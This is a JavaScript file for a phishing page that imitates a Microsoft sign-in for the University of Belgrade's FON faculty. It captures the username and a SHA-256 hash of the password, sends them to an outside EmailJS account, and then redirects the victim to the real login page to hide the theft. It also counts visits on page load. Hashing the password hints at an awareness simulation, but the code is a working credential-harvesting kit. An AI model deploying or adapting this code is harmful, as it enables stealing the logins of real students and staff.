const link = document.getElementById('link');
const fonContainer = document.getElementById('fon-container');
const microsoftPopup = document.getElementById('microsoft-popup-container');
const overlay = document.getElementById('overlay-container');
const signInButton = document.getElementById('sign-in-button');
const username = document.getElementById('username');
const password = document.getElementById('password');

link.addEventListener('click', () => {
  fonContainer.classList.replace('block', 'hidden');
  microsoftPopup.classList.replace('hidden', 'flex');

  setInterval(openPhishingSite, 3000);
});

function openPhishingSite() {
  microsoftPopup.classList.replace('flex', 'hidden');
  overlay.classList.replace('hidden', 'flex');
}

signInButton.addEventListener('click', async () => {
  if (username.value === '') {
    return;
  }
  if (password.value === '') {
    return;
  }

  const hash = await passHash(password.value);

  await emailjs
    .send('ZRS', 'template_qdm55vd', {
      message: `Username: ${username.value} + Password: ${hash}`,
    })
    .then(() => {
      //alert('Email sent successfully!');
      window.open(
        'https://fs.fon.bg.ac.rs/adfs/ls/?wa=wsignin1.0&wtrealm=urn:federation:MicrosoftOnline/',
        '_self'
      );
    })
    .catch((err) => {
      //console.error('Failed to send email:', err);
      //alert('Oops! Something went wrong.');
    });
});

function easyEncoding() {
  let pass = password.value;
  return '*'.repeat(pass.length);
}

function encodeTest() {
  let enc = new TextEncoder();
  return enc.encode('Banana');
}

async function passHash(pass) {
  const encoder = new TextEncoder();
  const data = encoder.encode(pass);

  const hashBuffer = await crypto.subtle.digest('SHA-256', data);

  const hashArray = Array.from(new Uint8Array(hashBuffer));
  const hashHex = hashArray
    .map((b) => b.toString(16).padStart(2, '0'))
    .join('');

  return hashHex;
}

//Calling my own backend

function incrementCounter() {
  fetch('/api/increment-counter')
    .then((res) => res.json())
    .then((data) => console.log('Counter incremented:', data.value))
    .catch((err) => console.error('Counter error:', err));
}

// Call on page load
incrementCounter();
